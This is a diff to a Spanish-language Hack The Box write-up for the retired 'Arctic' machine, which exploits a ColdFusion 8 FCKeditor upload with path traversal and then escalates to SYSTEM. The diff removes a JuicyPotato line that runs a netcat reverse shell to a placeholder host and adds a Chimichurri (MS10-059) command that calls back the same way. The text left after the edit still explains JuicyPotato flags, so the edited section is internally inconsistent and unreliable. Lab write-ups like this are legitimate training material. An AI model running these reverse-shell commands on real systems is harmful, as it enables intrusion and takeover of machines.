@@ -5,7 +5,7 @@ difficulty: Easy
 platform: Hack The Box
 category: Machines
 state: Retired
-tags: [windows, coldfusion, file-upload, seimpersonate, juicypotato]
+tags: [windows, coldfusion, file-upload, cve-2009-2265, ms10-059, chimichurri]
 ---
 
 # Arctic — Hack The Box
@@ -17,7 +17,7 @@ tags: [windows, coldfusion, file-upload, seimpersonate, juicypotato]
 
 ## TL;DR
 
-Un **ColdFusion 8** en el 8500 con el módulo FCKeditor accesible. La subida de ficheros del módulo acepta un `folder` con traversal, así que un JSP acaba en el directorio web y se ejecuta: shell como `tolis`. El box es un Windows Server 2008 R2 sin parchear y el token tiene `SeImpersonatePrivilege`, así que JuicyPotato (o MS10-059 como alternativa) remata a `SYSTEM`.
+Un **ColdFusion 8** en el 8500 con el módulo FCKeditor accesible. La subida de ficheros del módulo acepta un `folder` con traversal, así que un JSP acaba en el directorio web y se ejecuta: shell como `tolis`. El box es un Windows Server 2008 R2 sin parchear y el token tiene `SeImpersonatePrivilege`, así que **MS10-059** (Chimichurri, duplicación de tokens) remata a `SYSTEM`. Es la ruta que documentan los writeups de referencia; un Potato no es el camino canónico en este build.
 
 ## Reconocimiento
 
@@ -89,7 +89,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication   Enable
 Con `SeImpersonate` y sin parches, la vía corta es un token kidnapping:
 
 ```text
-JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe <IP> 4444 -e cmd.exe" -t *
+Chimichurri.exe <IP> 4444      # MS10-059: duplica el token y devuelve shell como SYSTEM
 ```
 
 `-t *` prueba todos los CLSID disponibles; en 2008 R2 funcionan los de BITS y varios más. Alternativa si el token kidnapping falla: **MS10-059** (Chimichurri), ya que el host es 2008 R2 sin actualizar.
